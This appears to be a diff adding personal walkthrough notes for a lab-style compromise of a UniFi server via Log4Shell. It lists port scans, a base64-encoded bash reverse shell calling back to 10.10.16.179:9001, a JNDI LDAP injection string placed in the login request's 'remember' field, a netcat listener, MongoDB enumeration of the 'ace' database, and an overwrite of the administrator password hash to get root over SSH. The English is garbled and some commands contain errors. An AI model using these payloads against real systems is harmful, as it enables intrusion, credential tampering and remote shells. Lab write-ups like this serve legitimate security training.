@@ -1,0 +1,31 @@
+1.nmap -sS -sC -sV -p- -vvv -oN scan_unified <IP>
+2. masscan -p0-65535 <IP> -inte=1000 -e tun0
+3. clone repository roguejndi
+4. download  maven a manager java proyect
+5. apply code  base64 with:
+echo "bash -c bash -i >&/dev/tcp/10.10.16.179/9001 0&1" | base64
+6. apply mv package in repository roguejndi
+7. later apply appcmd
+8. apply nc -nlvp 9001
+9. intercep traffic with proxy burpsuit and send since graphic interface unefi
+admin and password and capture api/login
+10.paste in json attribute remember:"${jndi:ldap://10.10.16.179:1389/o=tomcat}"
+11. we're going to primite reverse shell
+12. update shell with command line script /dev/null -c bash
+13, sendit process to second plane with ctrl+z and later typing fg and export TERM=xterm
+(autocomplete)
+13. if I want to see traffic of reconnection with our machine, open tcpdump
+and  typing tcpdump -i tun0 port 389(port listening for default LDPA server)
+14. exploiting user when access to machine, the first place is data/system.properties
+15. we saw that it has database local  mongodb in port 27117
+16. other method for analizing system is see the process with command ps -aux
+16.1 the default database name for UniFi applications "ace"
+17. I logged to mongo by commnand line with mongo --port 27117
+17.1 if we want to see command of app typing show dbs
+18. If We want to see users in data base use our the command:
+db.admin.find() too execute: mongo --port 27117 ace --eval "db.admin.find.forEach(printjson);"
+19. generate password code with sha-512 because its user have shadow-x key with $6$ that
+indicate codifing sha-512. With command line mkpasswd -m sha-512 password!
+20. modify object administrator password sha-512 with key x_shadow. The command execute is:
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<numberObject>")},{$set:{"x_shadow":"<hashpasswd>"}})'
+21. appy ssh root@<IP> and password found
